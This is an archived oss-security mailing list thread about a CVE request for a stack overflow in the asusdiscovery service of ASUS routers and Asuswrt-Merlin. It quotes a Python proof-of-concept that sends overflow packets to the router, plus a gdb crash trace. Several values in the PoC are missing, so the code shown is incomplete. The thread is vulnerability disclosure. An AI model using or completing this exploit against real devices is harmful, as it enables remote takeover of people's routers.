  oss-security - Re: CVE-IDs request for ASUS wiress router Remote  Command/Code Execution Vulnerability            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [day] [month] [year] [list]  Date: Tue, 18 Jul From: varsleak <varsleak@...il.com> To: Zach W <kestrel@...linux.us>, oss-security@...ts.openwall.com Subject: Re: CVE-IDs request for ASUS wiress router Remote  Command/Code Execution Vulnerability  Use  On varsleak wrote: > They are of course different, vulnerability code is > located in the networkmap service routine, and I found the vulnerability > in the asusdiscorvery service program. >  > 在 Zach W 写道: >> How is this different from >> >> Zach W. >> >> >> On PM, varsleak wrote: >>> Hello, I review the source of asuswrt-merlin and found a Remote >>> Command/Code Execution, the detail as follows: >>> >>> >>> 1. Vulnerability Details >>>      Affected >>>      >>>      >>>      >>>      >>>      and Asuswrt-Merlin(https://github.com/RMerl/asuswrt-merlin) >>>      Affected Product: ASUS Wiress Router >>>      Affected Version:  all the latest firmware >>>      Platform: router >>>      Impact: Remote Command/Code Execution >>>      Attack vector: asusdiscorvery service >>> >>> 2. Vulnerability Description >>>      When an ASUS router discovers another router device, >>>      it does not buffer the size of all discovered devices >>>      when it is added to the device list to cause a stack overflow, >>>      resulting in a remote code/command execution vulnerability. >>>      The vulnerability code is as follows: >>> >>> >>> >>> 3. PoC: >>> <<<EOF >>> # coding=utf-8 >>> >>> import time >>> import socket >>> import sys >>> import os >>> import threading >>> import struct >>> import random >>> import time >>> ''' Please run PoC first, and it must run on windows ''' >>> class ASUSDiscoveryBufferOverflow: >>> 	""" set remote host and remote port to use exp """ >>> 	def __init__(self, RHOST, RPORT, LHOST): >>> 		self.RHOST = RHOST >>> 		self.RPORT = RPORT >>> 		self.LHOST = LHOST >>> 	 >>> 	def exploit(self): >>> 		""" execute exploit """ >>> 		self.searchDevice() >>> 		self.sentShellCode() >>> 		 >>> 	def searchDevice(self, socket_prot = socket.IPPROTO_UDP): >>> 		""" search ASUS Discovery packet """ >>> 		print("    [-] try to search ASUS Discovery packet") >>> 		while(True): >>> 			sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_prot) >>> 			sniffer.bind((self.LHOST, 0)) >>> 			sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1) >>> 			if os.name == 'nt': >>> 				sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) >>> >>> 			pkt, hosts = >>> 			 >>> 			if self.RHOST == hosts[0] and '\x11' == pkt[9]: >>> 				if (pkt[28] == '\x0C' and >>> 				pkt[29] == '\x15' and >>> 				pkt[30] == '\x1F' ): >>> 					print("    [+] bingo!") >>> 					break >>> >>> 	def sentShellCode(self): >>> 		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) >>> 		 >>> 		for i in range(15): >>> 			s.sendto(self.makeShellCode(), (self.RHOST, self.RPORT)) >>> 			print(" [-] sent %d cycle" % (i + 1)) >>> 			time.sleep(0.2) >>> 	 >>> 	def generatingRandomMacAddr(self): >>> 		tmp1 = random.randint(0, 0xff) >>> 		tmp2 = random.randint(0, 0xff) >>> 		tmp3 = random.randint(0, 0xff) >>> 		tmp4 = random.randint(0, 0xff) >>> 		tmp5 = random.randint(0, 0xff) >>> 		tmp6 = random.randint(0, 0xff) >>> 		return struct.pack('6B', \ >>> 			tmp1, tmp2, tmp3, tmp4, tmp5, tmp6) >>> 			 >>> 	def makeShellCode(self):	 >>> 		shellcode = # HEADER [ PLEASE NOT MODIFY ] >>> 		shellcode += * b'A') # PKT_GET_INFO.PrinterInfo >>> 		shellcode += (32 * b'A')  # PKT_GET_INFO.SSID >>> 		shellcode += (32 * b'A')  # PKT_GET_INFO.NetMask >>> 		shellcode += (32 * b'A')  # PKT_GET_INFO.ProductID >>> 		shellcode += (16 * b'A')  # PKT_GET_INFO.FirmwareVersion >>> 		shellcode += b'A'		 # PKT_GET_INFO.OperationMode >>> 		shellcode += self.generatingRandomMacAddr() # PKT_GET_INFO.MacAddress	 >>> 		shellcode += * b'A') # >>> >>> 		return shellcode >>> 		 >>> def main(): >>> 	poc = >>> 	 >>> 	print("[+] Try to use exploit ...") >>> 	 >>> 	poc.exploit() >>> 	 >>> 	print("[+] use exploit sucessful.") >>> >>> if __name__ == '__main__': >>> 	main() >>> EOF; >>> >>> 4. gdb trace >>> gdb /usr/sbin/asusdiscovery >>> >>> GNU gdb 6.8 >>> Copyright (C) Free Software Foundation, Inc. >>> License GPLv3+: GNU GPL version 3 or later >>> <http://gnu.org/licenses/gpl.html> >>> This is free software: you are free to change and redistribute it. >>> There is NO WARRANTY, to the extent permitted by law.  Type "show copying" >>> and "show warranty" for details. >>> This GDB was configured as "mipsel-linux"... >>> I'm sorry, Dave, I can't do that.  Symbol format `elf32-tradlittlemips' >>> unknown. >>> (gdb) r >>> Starting program: /usr/sbin/asusdiscovery >>> >>> Program received signal SIGSEGV, Segmentation fault. >>> in ?? () >>> (gdb) info r >>>           zero       at       v0       v1       a0       a1       a2 >>>   a3 >>>  R0   >>> >>>             t0       t1       t2       t3       t4       t5       t6 >>>   t7 >>>  R8   >>> >>>             s0       s1       s2       s3       s4       s5       s6 >>>   s7 >>>  R16  >>> >>>             t8       t9       k0       k1       gp       sp       s8 >>>   ra >>>  R24  >>> >>>         status       lo       hi badvaddr    cause       pc >>>       >>>           fcsr      fir  restart >>>       >>> >>> As we have seen, the registers and pc are overwritten by >>> >>> >>> Finally, with the ROP can lead to Remote Command Execution. >>> >>> 5. Discover >>>     varsleak of Sichuan Silent Information Technology Co., Ltd >>>     company website: http://www.silence.com.cn/ >>  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      